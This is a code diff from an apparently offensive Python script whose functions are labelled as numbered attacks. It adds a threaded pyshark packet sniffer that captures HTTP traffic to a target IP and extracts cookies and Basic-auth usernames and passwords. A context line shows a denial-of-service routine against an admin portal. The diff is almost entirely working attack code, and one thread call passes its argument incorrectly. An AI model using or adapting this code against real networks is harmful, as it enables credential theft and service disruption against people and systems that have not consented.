@@ -217,21 +217,19 @@ def dos_admin_portal(target_url: str):
     print(f"[+] The Admin Portal has been successfully taken down!")
 
 
-# Attack 5 - Wireshark for password/cookie
-def listen_for_admin(target_url: str):
-    loop = asyncio.new_event_loop()
-
-    pass
+# Attack 5 - listening for password/cookie
+def listen_for_admin(target_ip: str):
+    threading.Thread(target=packet_capture, args=(target_ip), daemon=True).start()
 
 
 def packet_capture(target_ip: str):
-    capture = pyshark.LiveCapture(interface="en0", eventloop=loop)
+    capture = pyshark.LiveCapture(interface="en0")
 
     for packet in capture.sniff_continuously():
         if "ip" not in packet:
             print(packet)
             continue
-        if packet["ip"].dst == "192.168.0.1":
+        if packet["ip"].dst == target_ip:
             if "http" in packet:
                 fields = packet.http._all_fields
                 if "http.cookie_pair" in fields:
@@ -244,7 +242,7 @@ def packet_capture(target_ip: str):
                             "UTF-8"
                         )
                         username, password = creds_string.split(":")
-                        print(username, password)
+                        print("Found credential pair:", username, password)
 
 
 def get_sessionID(target_url: str, token: str) -> str:
